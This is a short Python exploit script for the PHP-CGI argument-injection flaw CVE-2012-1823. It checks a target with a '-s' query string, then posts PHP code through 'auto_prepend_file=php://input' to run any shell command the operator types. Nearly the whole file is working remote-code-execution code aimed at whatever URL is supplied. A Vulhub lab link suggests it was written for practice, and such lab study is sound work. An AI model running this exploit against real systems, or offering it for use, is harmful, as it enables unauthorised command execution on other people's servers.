# Coding by Noel
# Date:
# Version:php < 5.3.12 or php < 5.4.2
# Encoding utf-8
# Vulhub: https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823
#------------------------------------------------------------------

import requests
from bs4 import BeautifulSoup
import time 
import getopt
import sys
#------------------------------------------------------------------


def poc(target_url):
    print('Testing target_url is  Vulnerable or not......')
    CHECH_STRING = '/?-s'
    result = requests.get(url=target_url+CHECH_STRING, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'})
    result_content = BeautifulSoup(result.text, 'html.parser')
    if (result.status_code==200 and 'php' in str(result_content)):
        return True
    else:
        return False


def exp(target_url):
    RCE_STRING = '?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input'
    code = input('Please enter the code you wanna excute:')
    code = f'<?php echo system({code});?>'
    result = requests.post(url=target_url+RCE_STRING, headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}, data=code)
    print(result.text)


if __name__ == '__main__':
    # url = 'http://192.168.0.111:8080'
    target_url = '' 
    try:
        opts, args = getopt.getopt(sys.argv[1:],'-h-u:',['help','url='])
        if len(sys.argv) == 1 or not len(args) == 0:
             print(f'Usage python3 {sys.argv[0]} -u <tagrturl>')
             sys.exit(-1)
        for opt,value in opts:
            if opt in ('-u','url='):
               target_url=value
            elif opt in ('-h','--help'):
                print(f'Usage python3 {sys.argv[0]} -u <tagrturl>')
                sys.exit()
    except getopt.GetoptError:
        print(f'Usage python3 {sys.argv[0]} -u <tagrturl>')
        sys.exit(2)


    is_vulnerable = poc(target_url)
    if is_vulnerable == True:
        print('\033[1;32m[+] Vulnerable!!!\033[0m')
        time.sleep(0.5)
        exp(target_url)
    else:
        print(' \033[1;31m[-] No Vulnerable!!! \033[0m')
